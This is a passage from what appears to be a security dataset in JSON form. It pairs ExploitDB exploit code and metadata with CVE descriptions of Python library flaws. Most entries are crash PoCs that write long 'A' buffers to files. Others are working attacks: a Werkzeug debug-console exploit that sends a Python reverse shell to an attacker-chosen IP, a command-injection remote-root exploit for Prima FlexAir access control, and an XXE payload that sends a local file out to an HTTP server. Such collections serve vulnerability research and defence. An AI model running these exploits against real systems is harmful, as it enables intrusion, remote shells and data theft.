Set Search type to \"Local search\"\r\n# 5.- Paste ClipBoard on \"Search directory\" and click on \"Search\"\r\n# 6.- Boom! Crashed...\r\n\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 384\r\ncrash = \"/\" + buffer + \"BBBB\" + \"CCCC\"\r\nf = open(\"buff.txt\", \"w\")\r\nf.write(crash)\r\nf.close()\r\n\r\n# Note: If you have not \"/\" before payload, you should add it to begining of payload, So the program recognizes it as a valid path.\r\n\r\n\r\n# Exploit Title: FileZilla 3.40.0 - \"Local site\" Denial of Service (PoC)\r\n# Discovery by: Mr Winst0n\r\n# Discovery Date: February 25, 2019\r\n# Vendor Homepage: https://filezilla-project.org\r\n# Software Link : https://filezilla-project.org/download.php?type=client&show_all=1\r\n# Tested Version: 
3.40.0\r\n# Tested on: Kali linux x86_64\r\n# Vulnerability Type: Denial of Service (DoS)\r\n\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python filezilla-2.py\r\n# 2.- Open crash.txt and copy content to clipboard\r\n# 3.- In \"Local site\" section paste clipboard and Enter.\r\n# 4.- Boom! Crashed...\r\n\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 384\r\ncrash = \"/\" + buffer + \"BBBB\" + \"CCCC\"\r\nf = open(\"crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()\r\n\r\n# Note: If you have not \"/\" before payload, you should add it to begining of payload, So the program recognizes it as a valid path.", "description": "FileZilla 3.40.0 - 'Local search' / 'Local site' Denial of Service (PoC)", "author": "Mr Winst0n", "_id": 46484, "source": "ExploitDB", "platform": "linux", "date": "2019-03-04T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"source": "CVE", "_id": "2008-2315", "description": "Multiple integer overflows in Python 2.5.2 and earlier allow context-dependent 
attackers to have an unknown impact via vectors related to the (1) stringobject, (2) unicodeobject, (3) bufferobject, (4) longobject, (5) tupleobject, (6) stropmodule, (7) gcmodule, and (8) mmapmodule modules.  NOTE: The expandtabs integer overflows in stringobject and unicodeobject in 2.5.2 are covered by CVE-2008-5031.", "osvdb": [], "bid": [30491], "cve": ["CVE-2008-2315"], "msb": []}, {"source": "CVE", "_id": "2007-4965", "description": "Multiple integer overflows in the imageop module in Python 2.5.1 and earlier allow context-dependent attackers to cause a denial of service (application crash) and possibly obtain sensitive information (memory contents) via crafted arguments to (1) the tovideo method, and unspecified other vectors related to (2) imageop.c, (3) rbgimgmodule.c, and other files, which trigger heap-based buffer overflows.", "osvdb": [], "bid": [25696], "cve": ["CVE-2007-4965"], "msb": []}, {"source": "CVE", "_id": "2011-4137", "description": "The verify_exists functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 relies on Python libraries that attempt access to an arbitrary URL with no timeout, which allows remote attackers to cause a denial of service (resource consumption) via a URL associated with (1) a slow response, (2) a completed TCP connection with no application data sent, or (3) a large amount of application data, a related issue to CVE-2011-1521.", "osvdb": [], "bid": [], "cve": ["CVE-2011-4137"], "msb": []}, {"source": "CVE", "_id": "2014-1932", "description": "The (1) load_djpeg function in JpegImagePlugin.py, (2) Ghostscript function in EpsImagePlugin.py, (3) load function in IptcImagePlugin.py, and (4) _copy function in Image.py in Python Image Library (PIL) 1.1.7 and earlier and Pillow before 2.3.1 do not properly create temporary files, which allow local users to overwrite arbitrary files and obtain sensitive information via a symlink attack on the temporary file.", "osvdb": [], "bid": [65511], "cve": ["CVE-2014-1932"], "msb": []}, {"source": "CVE", "_id": "2012-0845", "description": "SimpleXMLRPCServer.py in SimpleXMLRPCServer in Python before 2.6.8, 2.7.x before 2.7.3, 3.x before 3.1.5, and 3.2.x before 3.2.3 allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via an XML-RPC POST request that contains a smaller amount of data than specified by the Content-Length header.", "osvdb": [], "bid": [], "cve": ["CVE-2012-0845"], "msb": []}, {"source": "CVE", "_id": "2018-17175", "description": "In the marshmallow 
library before 2.15.1 and 3.x before 3.0.0b9 for Python, the schema \"only\" option treats an empty list as implying no \"only\" option, which allows a request that was intended to expose no fields to instead expose all fields (if the schema is being filtered dynamically using the \"only\" option, and there is a user role that produces an empty value for \"only\").", "osvdb": [], "bid": [], "cve": ["CVE-2018-17175"], "msb": []}, {"source": "CVE", "_id": "2019-9636", "description": "Python 2.7.x through 2.7.16 and 3.x through 3.7.2 is affected by: Improper Handling of Unicode Encoding (with an incorrect netloc) during NFKC normalization. The impact is: Information disclosure (credentials, cookies, etc. that are cached against a given hostname). The components are: urllib.parse.urlsplit, urllib.parse.urlparse. The attack vector is: A specially crafted URL could be incorrectly parsed to locate cookies or authentication data and send that information to a different host than when parsed correctly.", "osvdb": [], 
"bid": [107400], "cve": ["CVE-2019-9636"], "msb": []}, {"source": "CVE", "_id": "2013-5942", "description": "Graphite 0.9.5 through 0.9.10 uses the pickle Python module unsafely, which allows remote attackers to execute arbitrary code via a crafted serialized object, related to (1) remote_storage.py, (2) storage.py, (3) render/datalib.py, and (4) whitelist/views.py, a different vulnerability than CVE-2013-5093.", "osvdb": [], "bid": [], "cve": ["CVE-2013-5942"], "msb": []}, {"source": "CVE", "_id": "2016-0772", "description": "The smtplib library in CPython (aka Python) before 2.7.12, 3.x before 3.4.5, and 3.5.x before 3.5.2 does not return an error when StartTLS fails, which might allow man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a \"StartTLS stripping attack.\"", "osvdb": [], "bid": [91225], "cve": ["CVE-2016-0772"], "msb": []}, {"code": "#!/usr/bin/env python\r\nimport requests\r\nimport sys\r\nimport re\r\nimport urllib\r\n\r\n# usage : python exploit.py 192.168.56.101 5000 192.168.56.102 4422 \r\n\r\nif len(sys.argv) != 5:\r\n    print \"USAGE: python %s <ip> <port> <your ip> <netcat port>\" % (sys.argv[0])\r\n    sys.exit(-1)\r\n\r\n\r\nresponse = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))\r\n\r\nif \"Werkzeug \" not in response.text:\r\n    
print \"[-] Debug is not enabled\"\r\n    sys.exit(-1)\r\n\r\n# since the application or debugger about python using python for 
reverse connect \r\ncmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);''' % (sys.argv[3],sys.argv[4])\r\n\r\n__debugger__ = 'yes'\r\n\r\nfrm = '0'\r\n\r\nresponse = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))\r\n\r\nsecret = re.findall(\"[0-9a-zA-Z]{20}\",response.text)\r\n\r\nif len(secret) != 1:\r\n    print \"[-] Impossible to get SECRET\"\r\n    sys.exit(-1)\r\nelse:\r\n    secret = secret[0]\r\n    print \"[+] SECRET is: \"+str(secret)\r\n\r\n# shell\r\nprint \"[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s\" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])\r\n\r\nraw_input(\"PRESS ENTER TO EXPLOIT\")\r\n\r\ndata = {\r\n        '__debugger__' : __debugger__,\r\n 
       'cmd' : str(cmd),\r\n        'frm' : frm,\r\n        's' : secret\r\n        }\r\n\r\n\r\nresponse = requests.get(\"http://%s:%s/console\" % (sys.argv[1],sys.argv[2]), params=data,headers=response.headers)\r\n\r\nprint \"[+] response from server\"\r\nprint \"status code: \" + str(response.status_code)\r\nprint \"response: \"+ str(response.text)", "description": "Werkzeug - 'Debug Shell' Command Execution", "author": "Ali BawazeEer", "_id": 43905, "source": "ExploitDB", "platform": "multiple", "date": "2018-01-28T00:00:00+00:00", "cve": [], "type": "remote", "port": 0}, {"code": "# Exploit Title: Prima FlexAir Access Control 2.3.38 - Remote Code Execution\r\n# Google Dork: NA\r\n# Date: 2018-09-06\r\n# Exploit Author: LiquidWorm\r\n# Vendor Homepage: https://www.primasystems.eu/\r\n# Software Link: https://primasystems.eu/flexair-access-control/\r\n# Version: 2.3.38\r\n# Tested on: NA\r\n# CVE : CVE-2019-7670\r\n\r\n#!/usr/bin/env python\r\n#\r\n# Authenticated Remote Root Exploit for Prima FlexAir Access Control 2.3.38\r\n# via Command Injection in SetNTPServer request, Server parameter.\r\n#\r\n# CVE: CVE-2019-7670\r\n# Advisory: https://applied-risk.com/resources/ar-2019-007\r\n# Paper: https://applied-risk.com/resources/i-own-your-building-management-system\r\n#\r\n# By Gjoko 'LiquidWorm' Krstic\r\n#\r\n# 18.01.2019\r\n#\r\n############################################################################\r\n#\r\n# $ python ntpcmdinj.py\r\n# [+] Usage: python ntpcmdinj.py [Target] [Session-ID] [Command]\r\n# [+] Example: python ntpcmdinj.py http://10.0.251.17:8080 10167847 whoami\r\n#\r\n# $ python ntpcmdinj.py http://192.168.230.17:8080 11339284 \"uname -a\"\r\n# Linux Alpha 4.4.16 #1 Mon Aug 29 13:29:40 CEST 2016 armv7l GNU/Linux\r\n#\r\n# $ python ntpcmdinj.py http://192.168.230.17:8080 11339284 id\r\n# uid=0(root) gid=0(root) groups=0(root),10(wheel)\r\n#\r\n############################################################################\r\n#\r\n\r\nimport requests\r\nimport sys#####\r\n\r\nif len(sys.argv) < 4:\r\n    print '[+] Usage: python ntpcmdinj.py [Target] [Session-ID] [Command]'\r\n    print '[+] Example: python ntpcmdinj.py http://10.0.0.17:8080 10167847 whoami\\n'\r\n    sys.exit()\r\n\r\nhost = sys.argv[1]\r\nsessionid = sys.argv[2]\r\ncommando = 
sys.argv[3]\r\n\r\nurl = host+\"/bin/sysfcgi.fx\"\r\n\r\nheaders = {\"Session-ID\"       : sessionid, # Muy importante!\r\n     
      \"User-Agent\"       : \"Dj/Ole\",\r\n           \"Content-Type\"     : \"application/x-www-form-urlencoded; charset=UTF-8\",\r\n           \"Accept\"           : \"text/html, */*; q=0.01\",\r\n           \"Session-Pc\"       : \"2\",\r\n           \"X-Requested-With\" : \"XMLHttpRequest\",\r\n           \"Accept-Encoding\"  : \"gzip, deflate\",\r\n           \"Accept-Language\"  : \"en-US,en;q=0.9\"}\r\n\r\npayload = (\"<requests><request name=\\\"SetNTPServer\\\">\"\r\n           \"<param name=\\\"Server\\\" value=\\\"2.europe.p\"\r\n           \"ool.ntp.org;\"+commando+\">/www/pages/ap\"\r\n           \"p/images/logos/stage.txt|\\\"/></request></\"\r\n           \"requests>\")\r\n\r\nrequests.post(url, headers=headers, data=payload)\r\n\r\ne = requests.get(host+\"/app/images/logos/stage.txt\")\r\nprint e.text", "description": "Prima FlexAir Access Control 2.3.38 - Remote Code Execution", "author": "LiquidWorm", "_id": 47612, "source": "ExploitDB", "platform": "hardware", "date": "2019-11-12T00:00:00+00:00", "cve": ["CVE-2019-7670"], "type": "webapps", "port": 0}, {"source": "CVE", "_id": "2014-9365", "description": "The HTTP 
clients in the (1) httplib, (2) urllib, (3) urllib2, and (4) xmlrpclib libraries in CPython (aka Python) 2.x before 2.7.9 and 3.x before 3.4.3, when accessing an HTTPS URL, do not (a) check the certificate against a trust store or verify that the server hostname matches a domain name in the subject's (b) Common Name or (c) subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.", "osvdb": [], "bid": [71639], "cve": ["CVE-2014-9365"], "msb": []}, {"code": "#Mediamonkey v. 3.2.1.1297 DOS POC\r\n#vulnerble application link http://www.mediamonkey.com/trialpay\r\n#tested on XP SP2/3\r\n\r\n#!/usr/bin/python\r\n\r\nfilename = \"crash.mp3\"\r\n\r\n\r\njunk = \"\\x41\" * 5000\r\n\r\ntextfile = open(filename , 'w')\r\ntextfile.write(junk)\r\ntextfile.close()", "description": "MediaMonkey 3.2.1.1297 - Denial of Service (PoC)", "author": "anonymous", "_id": 14555, "source": "ExploitDB", "platform": "windows", "date": "2010-08-05T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"source": "CVE", "_id": "2011-1521", "description": "The urllib and urllib2 modules in Python 2.x before 2.7.2 and 3.x before 3.2.1 process Location headers that specify redirection to file: URLs, which 
makes it easier for remote attackers to obtain sensitive information or cause a denial of service (resource consumption) via a crafted URL, as demonstrated by the file:///etc/passwd and file:///dev/zero URLs.", "osvdb": [], "bid": [], "cve": ["CVE-2011-1521"], "msb": []}, {"source": "CVE", "_id": "2012-1150", "description": "Python before 2.6.8, 2.7.x before 2.7.3, 3.x before 3.1.5, and 3.2.x before 3.2.3 computes hash values without restricting the ability to trigger hash collisions predictably, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted input to an application that maintains a hash table.", "osvdb": [], "bid": [], "cve": ["CVE-2012-1150"], "msb": []}, {"source": "CVE", "_id": "2012-0215", "description": "model/modelstorage.py in the Tryton application framework (trytond) before 2.4.0 for Python does not properly restrict access to the Many2Many field in the relation model, which allows remote authenticated users to modify the privileges of arbitrary users via a (1) create, (2) write, (3) delete, or (4) copy rpc call.", "osvdb": [], "bid": [], "cve": ["CVE-2012-0215"], "msb": []}, {"source": "CVE", "_id": "2019-13404", "description": "** DISPUTED ** The MSI installer for Python through 2.7.16 on Windows defaults to the C:\\Python27 directory, which makes it easier for local users to deploy Trojan horse code. (This also affects old 3.x releases before 3.5.) NOTE: the vendor's position is that it is the user's responsibility to ensure C:\\Python27 access control or choose a different directory, because backwards compatibility requires that C:\\Python27 remain the default for 2.7.x.", "osvdb": [], "bid": [], "cve": ["CVE-2019-13404"], "msb": []}, {"code": "# Exploit Title: CuteFTP Mac 3.1 Denial of Service (PoC)\r\n# Date: 2018-11-06\r\n# Exploit Author: Yair Rodr\u00edguez Aparicio\r\n# Vendor Homepage: https://www.globalscape.com/cuteftp\r\n# Software Link: http://go.globalscape.com/download/cuteftp-macosx\r\n# Version: 3.1\r\n# Tested on: macOS High Sierra 10.13\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python cute.py\r\n# 2.- Open text.txt and copy content to clipboard\r\n# 3.- Open CuteFTP Mac\r\n# 4.- Clic on \"Quick Connect\"\r\n# 4.- Paste clipboard on \"Host\", \"User\", \"Password\" and \"Port\"\r\n# 5.- click on \"Run\"\r\n# 6.- Crashed!\r\n\r\n\r\n\r\nbuffer = \"\\x41\" * 2000\r\nf = open(\"text.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "CuteFTP Mac 3.1 - Denial of Service (PoC)", "author": "Yair Rodr\u00edguez Aparicio", "_id": 45823, "source": "ExploitDB", "platform": "macos", "date": "2018-11-13T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: TaskInfo v8.2.0.280 - Denial of Service (PoC)\r\n# Discovery by: Rafael Pedrero\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: http://www.iarsn.com/\r\n# Software Link : http://www.iarsn.com/\r\n# Tested Version: v8.2.0.280\r\n# Tested on: Windows XP SP3\r\n# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run TaskInfo.exe\r\n# 2.- copy content TaskInfo_Crash.txt to clipboard (result from this python script)\r\n# 3.- Go to \"Help\" - \"Registration\" - \"Set or View Registration Information\" and paste the result in the \"New User Name:\" and \"New Serial Number:\" textbox.\r\n# 4.- Click in OK button and you will see a crash.\r\n\r\n\r\n#!/usr/bin/env python\r\n\r\n\r\ncrash = \"\\x41\" * 1000\r\nf = open (\"TaskInfo_Crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "TaskInfo 8.2.0.280 - Denial of Service (PoC)", "author": "Rafael Pedrero", "_id": 46314, "source": "ExploitDB", "platform": "windows", "date": "2019-02-04T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Nord VPN <= 6.14.31 - Denial of Service (PoC)\r\n# Exploit Author : L0RD (borna nematzadeh)\r\n# Contact: borna.nematzadeh123@gmail.com\r\n# Date: 2018-08-30\r\n# Vendor Homepage : https://nordvpn.com\r\n# Software link: https://nordvpn.com/download/\r\n# Version: <= 6.14.31\r\n# Tested on: Windows 10\r\n# CVE: N/A\r\n\r\n# Steps to reproduce:\r\n# 1) Run the python exploit code and open \"nord.txt\" file\r\n# 2) Copy the content of file\r\n# 3) Open Nord vpn\r\n# 4) Put anything (like test@test.com) into 
username field and paste content of \"nord.txt\" into password\r\n# 5) Crash!\r\n\r\n#!/usr/bin/python\r\n\r\nbuffer = \"\\x41\" * 100000\r\nf = open (\"nord.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()\r\nprint \"File created\"", "description": "Nord VPN 6.14.31 - Denial of Service (PoC)", "author": "L0RD", "_id": 45304, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-30T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#Exploit Title: SpotAuditor 5.3.2 - 'Key' Denial 
of Service\r\n#Exploit Author : ZwX\r\n#Exploit Date: 2019-11-28\r\n#Vendor Homepage : http://www.nsauditor.com/\r\n#Link Software : http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe\r\n#Tested on OS: Windows 7\r\n#Social: twitter.com/ZwX2a\r\n\r\n'''\r\nProof of Concept (PoC):\r\n=======================\r\n\r\n1.Download and install SpotAuditor\r\n2.Run the python operating script that will create a file (poc.txt)\r\n3.Run the software \"Register -> Enter Registration Code\r\n4.Copy and paste the characters in the file (poc.txt)\r\n5.Paste the characters in the field 'Key' and click on 'Ok'\r\n6.SpotAuditor Crashed\r\n'''\r\n#!/usr/bin/python\r\n\r\nhttp = \"http//\"\r\nbuffer = \"\\x41\" * 2000\r\n\r\n\r\npoc = http + buffer \r\nfile = open(\"poc.txt\",\"w\")\r\nfile.write(poc)\r\nfile.close()\r\n \r\nprint \"POC Created by ZwX\"", "description": "SpotAuditor 5.3.2 - 'Key' Denial of Service", "author": "ZwX", "_id": 47723, "source": "ExploitDB", "platform": "windows", "date": "2019-11-29T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: TextCrawler Pro3.1.1 - Denial of Service (PoC)\r\n# Date: 2020-05-01\r\n# Vendor Homepage:https://www.digitalvolcano.co.uk/index.html\r\n# Software Link:  https://www.digitalvolcano.co.uk/download/TextCrawlerPro=setup.exe\r\n# Exploit Author: Achilles\r\n# Tested Version: 3.1.1\r\n# Tested on: Windows 7 x64\r\n\r\n\r\n# 1.- Run python code :TextCrawler.py\r\n# 2.- Open EVIL.txt and copy content to clipboard\r\n# 3.- Open TextCrawler Pro\r\n# 4.- Paste the content of EVIL.txt into the Field: 'License key'\r\n# 5.- Click 'Activate' and you will see a crash.\r\n\r\n\r\n\r\n#!/usr/bin/env python\r\nbuffer =3D \"\\x41\" * 6000\r\n\r\ntry:\r\nopen(\"Evil.txt\",\"w\")\r\nprint \"[+] Creating %s bytes evil payload..\" %len(buffer)\r\nf.write(buffer)\r\nf.close()\r\nprint \"[+] File created!\"\r\nexcept:\r\nprint \"File cannot be created\"", "description": "TextCrawler Pro3.1.1 - Denial of Service (PoC)", "author": "stresser", "_id": 47862, 
"source": "ExploitDB", "platform": "windows", "date": "2020-01-06T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: a-Mac Address Change v5.4 - Denial of Service (PoC)\r\n# Discovery by: Rafael Pedrero\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: http://amac.paqtool.com/\r\n# Software Link : http://amac.paqtool.com/\r\n# Tested Version: 5.4\r\n# Tested on: Windows XP SP3\r\n# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow\r\n\r\n# Steps to Produce 
the Crash:\r\n# 1.- Run amac.exe\r\n# 2.- copy content amac_Crash.txt or 212 \"A\" to clipboard (result from this python script)\r\n# 3.- Go to Register - Amac Register Form and paste the result in all fields: \"Your Name\", \"Your Company\", \"Register Code\"\r\n# 4.- Click in Register button and you will see a crash.\r\n\r\n#!/usr/bin/env python\r\n\r\ncrash = \"\\x41\" * 212\r\nf = open (\"amac_Crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "AMAC Address Change 5.4 - Denial of Service (PoC)", "author": "Rafael Pedrero", "_id": 46292, "source": "ExploitDB", "platform": "windows", "date": "2019-01-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: River Past Ringtone Converter v2.7.6.1601 - Denial of Service (PoC)\r\n# Discovery by: Rafael Pedrero\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: http://www.riverpast.com/\r\n# Software Link : http://www.riverpast.com/\r\n# Tested Version: v2.7.6.1601\r\n# Tested on: Windows XP SP3\r\n# Vulnerability 
Type: Denial of Service (DoS) Local Buffer Overflow\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run RingtoneConverter.exe\r\n# 2.- copy content RingtoneConverter_Crash.txt to clipboard (result from this python script)\r\n# 3.- Go to \"Help\" - \"Activate...\" and paste the result in the \"Email\" textbox and \"Activation code\" textarea.\r\n# 4.- Click in Activate button and you 
will see a crash.\r\n\r\n\r\n#!/usr/bin/env python\r\n\r\n\r\ncrash = \"\\x41\" * 300\r\nf = open (\"RingtoneConverter_Crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "River Past Ringtone Converter 2.7.6.1601 - Denial of Service (PoC)", "author": "Rafael Pedrero", "_id": 46312, "source": "ExploitDB", "platform": "windows", "date": "2019-02-04T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#Exploit Title: SpotAuditor 5.3.2 - 'Base64' Denial Of Service (PoC)\r\n#Exploit Author : ZwX\r\n#Exploit Date: 2019-11-26\r\n#Vendor Homepage : http://www.nsauditor.com/\r\n#Link Software : http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe\r\n#Tested on OS: Windows 7\r\n\r\n\r\n'''\r\nProof of Concept (PoC):\r\n=======================\r\n\r\n1.Download and install SpotAuditor\r\n2.Run the python operating script that will create a file (poc.txt)\r\n3.Run the software \"Tools -> Base64 Encrypted Password\r\n4.Copy and paste the characters in the file (poc.txt)\r\n5.Paste the characters in the field 'Base64 Encrypted Password' and click on 'Decrypt'\r\n6.SpotAuditor Crashed\r\n'''\r\n#!/usr/bin/python\r\n\r\nhttp = \"http//\"\r\nbuffer = \"\\x41\" * 2000\r\n\r\n\r\npoc = http + buffer \r\nfile = open(\"poc.txt\",\"w\")\r\nfile.write(poc)\r\nfile.close()\r\n \r\nprint \"POC Created by ZwX\"", "description": "SpotAuditor 5.3.2 - 'Base64' Denial Of Service (PoC)", "author": "ZwX", "_id": 47719, "source": "ExploitDB", "platform": "windows", "date": "2019-11-27T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: MSN Password Recovery 1.30 - Denial of Service (PoC)\r\n# Date: 2020-01-02\r\n# Vendor Homepage: https://www.top-password.com/\r\n# Software Link: https://www.top-password.com/download/MSNPRSetup.exe\r\n# Exploit Author: Gokkulraj\r\n# Tested Version: v1.30\r\n# Tested on: Windows 7 x64\r\n\r\n# 1.- Download and install MSN Password Recovery\r\n# 2.- Run python code : MSN Password Recovery.py\r\n# 3.- Open CRASH.txt and copy content to clipboard\r\n# 4.- Open MSN Password Recovery and Click 'EnterKey'\r\n# 5.- Paste the content of CRASH.txt into the Field: 'User Name and\r\nRegistration Code'\r\n# 6.- click 'OK' you will see a crash.\r\n\r\n#!/usr/bin/env python\r\nDos= \"\\x41\" * 9000\r\nmyfile=open('CRASH.txt','w')\r\nmyfile.writelines(Dos)\r\nmyfile.close()\r\nprint(\"File created\")", "description": "MSN Password Recovery 1.30 - Denial of Service (PoC)", "author": "Gokkulraj", "_id": 47839, "source": "ExploitDB", "platform": "windows", "date": "2020-01-02T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: XML Notepad 2.8.0.4 - XML External Entity Injection\r\n# Date: 2019-11-11\r\n# Exploit Author: 8-Team / daejinoh\r\n# Vendor Homepage:  https://www.microsoft.com/  \r\n# Software Link:  https://github.com/microsoft/XmlNotepad  \r\n# Version: XML Notepad 2.8.0.4\r\n# Tested on: Windows 10 Pro\r\n# CVE : N/A\r\n\r\n# Step\r\n1) File -> Open -> *.xml\r\n\r\n# Exploit Code\r\n\r\n1) Server(python 3.7) : python -m http.server\r\n2) Poc.xml : \r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE test [\r\n<!ENTITY % file SYSTEM \"C:\\Windows\\win.ini\">\r\n<!ENTITY % dtd SYSTEM \"http://127.0.0.1:8000/payload.dtd\">\r\n%dtd;]>\r\n<pwn>&send;</pwn>\r\n\r\n3) payload.dtd\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>\">\r\n%all;\r\n\r\n  --------------------------------------------------------------------------------", "description": "XML Notepad 2.8.0.4 - XML External Entity Injection", "author": "daejinoh", "_id": 47606, "source": "ExploitDB", "platform": "xml", "date": "2019-11-11T00:00:00+00:00", "cve": [], "type": "local", "port": 0}, {"code": "#Exploit Title: XMedia Recode 3.4.8.6 - '.m3u' Denial Of Service\r\n#Exploit Author : ZwX\r\n#Exploit Date: 2019-11-18\r\n#Vendor Homepage : https://www.xmedia-recode.de/\r\n#Link Software : https://www.xmedia-recode.de/download.php\r\n#Tested on OS: Windows 7\r\n#Social: twitter.com/ZwX2a\r\n#contact: msk4@live.fr\r\n\r\n'''\r\nProof of Concept (PoC):\r\n=======================\r\n\r\n1.Download and install XMedia Recode \r\n2.Run the python operating script that will create a file (poc.m3u)\r\n3.Run the software \"File -> Open File -> Add the file (.m3u) \"\r\n4.XMedia Recode Crashed\r\n'''\r\n\r\n#!/usr/bin/python\r\n\r\nhttp = \"http://\" \r\nbuffer = \"\\x41\" * 500 \r\n\r\npoc = http + buffer\r\nfile = open(\"poc.m3u,\"w\")\r\nfile.write(poc)\r\nfile.close()\r\n\r\nprint \"POC Created by ZwX\"", "description": "XMedia Recode 3.4.8.6 - '.m3u' Denial Of Service", "author": "ZwX", "_id": 47679, "source": "ExploitDB", "platform": "windows", "date": "2019-11-19T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Arm Whois 3.11 - Denial of Service (PoC)\r\n# Date: 2018-10-31\r\n# Exploit Author: Yair Rodr\u00edguez Aparicio\r\n# Vendor Homepage: http://www.armcode.com/\r\n# Software Link: http://www.armcode.com/downloads/arm-whois.exe\r\n# Version: 3.11\r\n# Tested on: Windows XP Profesional Espa\u00f1ol SP3 x86 \r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python whois.py\r\n# 2.- Open text.txt and copy content to clipboard\r\n# 3.- Open whois.exe\r\n# 4.- Paste clipboard on \"IP address or domain\"\r\n# 5.- click on \"Retrieves IP-adress info\"\r\n# 6.- Crashed!\r\n\r\nbuffer = \"\\x41\" * 700\r\nf = open(\"text.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Arm Whois 3.11 - Denial of Service (PoC)", "author": "Yair Rodr\u00edguez Aparicio", "_id": 45762, "source": "ExploitDB", "platform": "windows_x86", "date": "2018-11-01T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: scadaApp for iOS 1.1.4.0 - 'Servername' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2019-11-18\r\n# Vendor Homepage: https://apps.apple.com/ca/app/scadaapp/id1206266634\r\n# Software Link: App Store for 
iOS devices\r\n# Tested Version: 1.1.4.0\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: iPhone 7 iOS 
13.2\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code: scadaApp_for_iOS_1.1.4.0.py\r\n# 2.- Copy content to clipboard\r\n# 3.- Open \"scadaApp for iOS\"\r\n# 4.- Let's go\r\n# 5.- Username > \"l4m5\"\r\n# 6.- Password > \"l4m5\"\r\n# 7.- Paste ClipBoard on \"Servername\"\r\n# 8.- Login\r\n# 9.- Crashed\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 257\r\nprint (buffer)", "description": "scadaApp for iOS 1.1.4.0 - 'Servername' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", 
"_id": 47678, "source": "ExploitDB", "platform": "ios", "date": "2019-11-19T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Total Video Player 1.31 .m3u Crash Poc \r\n# Date: June 17 2012  \r\n# Exploit Author: 0dem\r\n# Vendor Homepage: http://www.effectmatrix.com/\r\n# Software Link: http://download.cnet.com/Total-Video-Player/3000-2139_4-10552696.html\r\n# Version: V1.31\r\n# Tested on: Windows XP SP 3\r\n# Description:   Total Video Player has no correct input handling 
and will hang, \r\n#   when trying to open malformed .m3u files. .mp3 and .avi files are affected too\r\n\r\n# --- m3u -----------------------------------------------\r\n#!/usr/bin/python\r\njunk = \"#EXTM3U\\n\"\r\njunk += \"#EXTINF:666, 0dem, 0dem\\n\"\r\njunk += \"c:\\\\A\"\r\n\r\nfile = open(\"PoC.m3u\",\"w\")\r\nfile.writelines(junk)\r\nfile.close()\r\n\r\n# --- mp3 -----------------------------------------------\r\n#!/usr/bin/python\r\njunk = \"\\x41\" * 100\r\nfile = open(\"PoC.mp3\",\"w\")\r\nfile.writelines(junk)\r\nfile.close()\r\n\r\n# --- avi -----------------------------------------------\r\n#!/usr/bin/python\r\njunk = 
\"\\x41\" * 100\r\nfile = open(\"PoC.avi\",\"w\")\r\nfile.writelines(junk)\r\nfile.close()", "description": "Total Video Player 
